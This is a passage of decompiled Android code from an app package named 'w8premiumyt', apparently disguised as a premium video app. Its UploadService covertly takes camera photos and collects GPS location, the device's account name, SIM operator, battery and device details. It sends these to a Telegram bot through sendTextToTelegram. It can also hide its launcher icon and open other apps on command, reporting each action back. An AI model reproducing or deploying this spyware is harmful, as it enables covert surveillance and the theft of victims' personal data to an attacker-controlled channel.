            Object systemService2 = this$0.getSystemService("location");
            Intrinsics.checkNotNull(systemService2, "null cannot be cast to non-null type android.location.LocationManager");
            LocationManager lm = (LocationManager) systemService2;
            List<String> providers = lm.getProviders(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۳Boolean$arg0$callgetProviders$valproviders$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService());
            Intrinsics.checkNotNullExpressionValue(providers, "lm.getProviders(true)");
            List<String> list = providers;
            Location loc = null;
            for (String provider : list) {
                List<String> list2 = list;
                try {
                    l = lm.getLastKnownLocation(provider);
                } catch (Exception e) {
                    l = null;
                }
                if (l == null || (loc != null && l.getTime() <= loc.getTime())) {
                    list = list2;
                } else {
                    loc = l;
                    list = list2;
                }
            }
            if (loc != null) {
                locationStr2 = LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۹String$0$str$setlocationStr$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + loc.getLatitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۷String$2$str$setlocationStr$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + loc.getLongitude();
                locationStr = locationStr2;
                mapsUrl = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۱String$0$str$setmapsUrl$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + loc.getLatitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۹String$2$str$setmapsUrl$branch$if$try$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + loc.getLongitude();
            } else {
                locationStr = locationStr2;
                mapsUrl = mapsUrl2;
            }
        } catch (Exception e2) {
            locationStr = locationStr2;
            mapsUrl = mapsUrl2;
        }
        try {
            rot = this$0.getResources().getConfiguration().orientation;
        } catch (Exception e3) {
        }
        try {
            orientationStr = rot == 2 ? LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۷String$branch$if$try$valorientationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() : LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۰۰String$else$if$try$valorientationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        } catch (Exception e4) {
            orientationStr = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۱String$catch$valorientationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        }
        Intent batteryStatus = this$0.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
        LiveLiterals$UploadServiceKt liveLiterals$UploadServiceKt2 = LiveLiterals$UploadServiceKt.INSTANCE;
        int batteryLevel = batteryStatus != null ? batteryStatus.getIntExtra("level", liveLiterals$UploadServiceKt2.m۲۹۷Int$arg1$callgetIntExtra$else$when$valtmp3_elvis_lhs$valbatteryLevel$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()) : liveLiterals$UploadServiceKt2.m۳۲۲Int$branch$when$valbatteryLevel$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        int batteryScale = batteryStatus != null ? batteryStatus.getIntExtra("scale", LiveLiterals$UploadServiceKt.INSTANCE.m۲۹۹Int$arg1$callgetIntExtra$else$when$valtmp5_elvis_lhs$valbatteryScale$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()) : LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۴Int$branch$when$valbatteryScale$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        float batteryPct = (batteryLevel == LiveLiterals$UploadServiceKt.INSTANCE.m۲۹۱Int$arg1$callEQEQ$$this$callnot$cond$cond$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() || batteryScale == LiveLiterals$UploadServiceKt.INSTANCE.m۲۸۸Int$arg1$callEQEQ$$this$callnot$branch$cond$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()) ? LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۱Float$else$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() : (LiveLiterals$UploadServiceKt.INSTANCE.m۲۷۷Int$arg0$calltimes$$this$calldiv$branch$if$valbatteryPct$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() * batteryLevel) / batteryScale;
        try {
            str = this$0.getPackageManager().getPackageInfo(this$0.getPackageName(), LiveLiterals$UploadServiceKt.INSTANCE.m۳۰۴Int$arg1$callgetPackageInfo$try$valappVersion$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()).versionName;
        } catch (Exception e5) {
            str = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۸۹String$catch$valappVersion$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        }
        String appVersion = str;
        String deviceName = Build.MODEL;
        String exposure2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۳String$valexposure$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        String iso3 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۵String$valiso$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        try {
            CameraCharacteristics characteristics = $cameraManager.getCameraCharacteristics($cameraId);
            try {
                Intrinsics.checkNotNullExpressionValue(characteristics, "cameraManager.getCameraCharacteristics(cameraId)");
                Range range = (Range) characteristics.get(CameraCharacteristics.SENSOR_INFO_EXPOSURE_TIME_RANGE);
                String string2 = range != null ? range.toString() : null;
                if (string2 == null) {
                    string2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۳String$branch$when$setexposure$try1$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
                }
                exposure2 = string2;
                Range range2 = (Range) characteristics.get(CameraCharacteristics.SENSOR_INFO_SENSITIVITY_RANGE);
                String string3 = range2 != null ? range2.toString() : null;
                if (string3 == null) {
                    string3 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۵String$branch$when$setiso$try1$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
                }
                String iso4 = string3;
                exposure = exposure2;
                file = file2;
                iso = iso4;
            } catch (Exception e6) {
                exposure = exposure2;
                file = file2;
                iso = iso3;
            }
        } catch (Exception e7) {
        }
        String userAccount2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۲۳String$valuserAccount$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        String simInfo2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۲۱String$valsimInfo$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        try {
            systemService = this$0.getSystemService("account");
            iso2 = iso;
        } catch (Exception e8) {
            iso2 = iso;
        }
        try {
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.accounts.AccountManager");
            AccountManager am = (AccountManager) systemService;
            Account[] accounts = am.getAccounts();
            Intrinsics.checkNotNullExpressionValue(accounts, "am.accounts");
            Account account = (Account) ArraysKt.firstOrNull(accounts);
            String str2 = account != null ? account.name : null;
            if (str2 == null) {
                str2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۹String$branch$when$setuserAccount$try2$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
            }
            String userAccount3 = str2;
            userAccount = userAccount3;
        } catch (Exception e9) {
            userAccount = userAccount2;
        }
        try {
            Object systemService3 = this$0.getSystemService("phone");
            Intrinsics.checkNotNull(systemService3, "null cannot be cast to non-null type android.telephony.TelephonyManager");
            TelephonyManager tm = (TelephonyManager) systemService3;
            String simOperatorName = tm.getSimOperatorName();
            if (simOperatorName == null) {
                simOperatorName = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۶۷String$branch$when$setsimInfo$try3$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
            }
            String simInfo3 = simOperatorName;
            simInfo = simInfo3;
        } catch (Exception e10) {
            simInfo = simInfo2;
        }
        StringBuilder meta = new StringBuilder();
        String simInfo4 = simInfo;
        StringBuilder sb = new StringBuilder();
        String userAccount4 = userAccount;
        String userAccount5 = LiveLiterals$UploadServiceKt.INSTANCE.m۴۷۶String$0$str$arg0$callappendLine$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        StringBuilder sbAppend = meta.append(sb.append(userAccount5).append(cameraType).toString());
        Intrinsics.checkNotNullExpressionValue(sbAppend, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend.append('\n'), "append('\\n')");
        String exposure3 = exposure;
        StringBuilder sbAppend2 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۰String$0$str$arg0$callappendLine1$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + dateStr);
        Intrinsics.checkNotNullExpressionValue(sbAppend2, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend2.append('\n'), "append('\\n')");
        StringBuilder sbAppend3 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۰String$0$str$arg0$callappendLine2$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + width + LiveLiterals$UploadServiceKt.INSTANCE.m۶۴۸String$2$str$arg0$callappendLine2$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + height);
        Intrinsics.checkNotNullExpressionValue(sbAppend3, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend3.append('\n'), "append('\\n')");
        StringBuilder sbAppend4 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۳String$0$str$arg0$callappendLine3$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + fileSize + LiveLiterals$UploadServiceKt.INSTANCE.m۶۵۰String$2$str$arg0$callappendLine3$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService());
        Intrinsics.checkNotNullExpressionValue(sbAppend4, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend4.append('\n'), "append('\\n')");
        StringBuilder sbAppend5 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۶String$0$str$arg0$callappendLine4$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + deviceName);
        Intrinsics.checkNotNullExpressionValue(sbAppend5, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend5.append('\n'), "append('\\n')");
        StringBuilder sbAppend6 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۹۸String$0$str$arg0$callappendLine5$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + appVersion);
        Intrinsics.checkNotNullExpressionValue(sbAppend6, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend6.append('\n'), "append('\\n')");
        StringBuilder sbAppend7 = new StringBuilder().append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۰String$0$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService());
        if (batteryPct >= LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۵Int$$this$calltoFloat$arg1$callgreaterOrEqual$cond$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()) {
            StringBuilder sb2 = new StringBuilder();
            StringCompanionObject stringCompanionObject = StringCompanionObject.INSTANCE;
            String str3 = String.format(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۷String$arg0$callformat$$this$callplus$branch$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService(), Arrays.copyOf(new Object[]{Float.valueOf(batteryPct)}, 1));
            Intrinsics.checkNotNullExpressionValue(str3, "format(format, *args)");
            string = sb2.append(str3).append(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۳String$arg0$callplus$branch$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()).toString();
        } else {
            string = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۴String$else$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        }
        StringBuilder sbAppend8 = meta.append(sbAppend7.append(string).toString());
        Intrinsics.checkNotNullExpressionValue(sbAppend8, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend8.append('\n'), "append('\\n')");
        StringBuilder sbAppend9 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۲String$0$str$arg0$callappendLine7$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + orientationStr);
        Intrinsics.checkNotNullExpressionValue(sbAppend9, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend9.append('\n'), "append('\\n')");
        StringBuilder sbAppend10 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۴String$0$str$arg0$callappendLine8$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + locationStr);
        Intrinsics.checkNotNullExpressionValue(sbAppend10, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend10.append('\n'), "append('\\n')");
        if (mapsUrl.length() > 0) {
            StringBuilder sbAppend11 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۷۴String$0$str$arg0$callappendLine$branch$if$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + mapsUrl);
            Intrinsics.checkNotNullExpressionValue(sbAppend11, "append(value)");
            Intrinsics.checkNotNullExpressionValue(sbAppend11.append('\n'), "append('\\n')");
        }
        StringBuilder sbAppend12 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۶String$0$str$arg0$callappendLine9$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + exposure3);
        Intrinsics.checkNotNullExpressionValue(sbAppend12, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend12.append('\n'), "append('\\n')");
        StringBuilder sbAppend13 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۲String$0$str$arg0$callappendLine10$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + iso2);
        Intrinsics.checkNotNullExpressionValue(sbAppend13, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend13.append('\n'), "append('\\n')");
        StringBuilder sbAppend14 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۴String$0$str$arg0$callappendLine11$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + userAccount4);
        Intrinsics.checkNotNullExpressionValue(sbAppend14, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend14.append('\n'), "append('\\n')");
        StringBuilder sbAppend15 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۶String$0$str$arg0$callappendLine12$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + simInfo4);
        Intrinsics.checkNotNullExpressionValue(sbAppend15, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend15.append('\n'), "append('\\n')");
        BuildersKt.launch$default(this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$takeAndSendPhoto$3$1(this$0, file, meta, null), 3, (Object) null);
        $imageReader.close();
        $handlerThread.quitSafely();
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$takeAndSendPhoto$4, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$takeAndSendPhoto$4", f = "UploadService.kt", i = {}, l = {2278}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۵۹4 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Exception $e;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۵۹4(Exception exc, Continuation<? super C۰۰۵۹4> continuation) {
            super(2, continuation);
            this.$e = exc;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۵۹4(this.$e, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۹String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funtakeAndSendPhoto$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private final void setLauncherIconVisible(boolean visible) {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, Class.forName(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۶String$arg0$callforName$arg1$call$init$$valcomponentName$try$funsetLauncherIconVisible$classUploadService()));
            int newState = visible ? 1 : 2;
            pm.setComponentEnabledSetting(componentName, newState, 1);
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۶۰String$arg0$calle$catch$funsetLauncherIconVisible$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۷۹String$0$str$arg1$calle$catch$funsetLauncherIconVisible$classUploadService() + e.getMessage());
        }
    }

    private final void openAppByPackage(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            Intent intent = pm.getLaunchIntentForPackage(pkg);
            if (intent == null) {
                BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۱۱2(pkg, null), 3, (Object) null);
            } else {
                intent.addFlags(268435456);
                startActivity(intent);
                BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۱۰1(pkg, null), 3, (Object) null);
            }
        } catch (Exception e) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۱۲3(pkg, e, null), 3, (Object) null);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$openAppByPackage$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$openAppByPackage$1", f = "UploadService.kt", i = {}, l = {2305}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۱۰1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $pkg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۱۰1(String str, Continuation<? super C۰۰۱۰1> continuation) {
            super(2, continuation);
            this.$pkg = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۱۰1(this.$pkg, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۱۴String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$if$try$funopenAppByPackage$classUploadService() + this.$pkg, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$openAppByPackage$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$openAppByPackage$2", f = "UploadService.kt", i = {}, l = {2307}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۱۱2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $pkg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۱۱2(String str, Continuation<? super C۰۰۱۱2> continuation) {
            super(2, continuation);
            this.$pkg = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۱۱2(this.$pkg, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۳String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$try$funopenAppByPackage$classUploadService() + this.$pkg, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$openAppByPackage$3, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$openAppByPackage$3", f = "UploadService.kt", i = {}, l = {2310}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۱۲3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Exception $e;
        final /* synthetic */ String $pkg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۱۲3(String str, Exception exc, Continuation<? super C۰۰۱۲3> continuation) {
            super(2, continuation);
            this.$pkg = str;
            this.$e = exc;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۱۲3(this.$pkg, this.$e, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۷String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funopenAppByPackage$classUploadService() + this.$pkg + LiveLiterals$UploadServiceKt.INSTANCE.m۶۵۷String$2$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funopenAppByPackage$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendTextToTelegram(java.lang.String r22, kotlin.coroutines.Continuation<? super kotlin.Unit> r23) {
        /*
            Method dump skipped, instruction units count: 314
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendTextToTelegram(java.lang.String, kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendTextToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendTextToTelegram$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۴۵2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ FormBody $requestBody;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۴۵2(FormBody formBody, Continuation<? super C۰۰۴۵2> continuation) {
            super(2, continuation);
            this.$requestBody = formBody;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۴۵2(this.$requestBody, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    Response response = (Closeable) UploadService.this.client.newCall(new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۴۱String$0$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegram$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۶String$2$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegram$classUploadService()).post(this.$requestBody).build()).execute();
                    try {
                        Response response2 = response;
                        if (!response2.isSuccessful()) {
                            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۲۳String$arg0$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegram$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۶۵String$0$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegram$classUploadService() + response2.code() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۴String$2$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextToTelegram$classUploadService() + response2.message());
                        }
                        Unit unit = Unit.INSTANCE;
                        CloseableKt.closeFinally(response, (Throwable) null);
                        return Unit.INSTANCE;
                    } finally {
                    }
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    private final void startGalleryPhotoSending() {
